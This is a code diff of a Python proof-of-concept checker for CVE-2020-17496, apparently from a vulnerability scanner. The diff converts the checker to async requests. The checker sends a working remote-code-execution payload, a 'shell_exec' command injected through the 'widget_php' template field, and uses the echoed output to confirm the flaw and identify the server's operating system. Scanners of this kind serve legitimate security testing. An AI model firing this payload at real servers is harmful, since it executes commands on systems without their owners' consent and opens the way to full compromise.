@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class CVE_2020_17496_BaseVerify:
      def __init__(self, url):
@@ -25,7 +25,7 @@ class CVE_2020_17496_BaseVerify:
             'User-Agent': get_useragent()
           }
 
-     def check(self):
+     async def check(self):
     
           """
           检测是否存在漏洞
@@ -40,19 +40,15 @@ class CVE_2020_17496_BaseVerify:
                     'subWidgets[0][template]' : 'widget_php',
                     'subWidgets[0][config][code]' : "echo shell_exec('%s'); exit;" % ('echo ' + self.capta + 'win^dowslin$1ux')
                }
-               check_req = request.post(self.payload_url, data = check_payload)
-               if check_req.status_code == 200 and self.capta in check_req.text:
-                    if 'windows' in check_req.text:
+               check_req = await request.post(self.payload_url, data = check_payload)
+               if check_req.status == 200 and self.capta in await check_req.text():
+                    if 'windows' in await check_req.text():
                          self.osname = 'Windows'
-                    elif 'linux' in check_req.text:
+                    elif 'linux' in await check_req.text():
                          self.osname = 'Linux'
                     return True
-               else:
-                    return False
           except Exception as e:
                # print(e)
-               return False
-          finally:
                pass
 
 if  __name__ == "__main__":
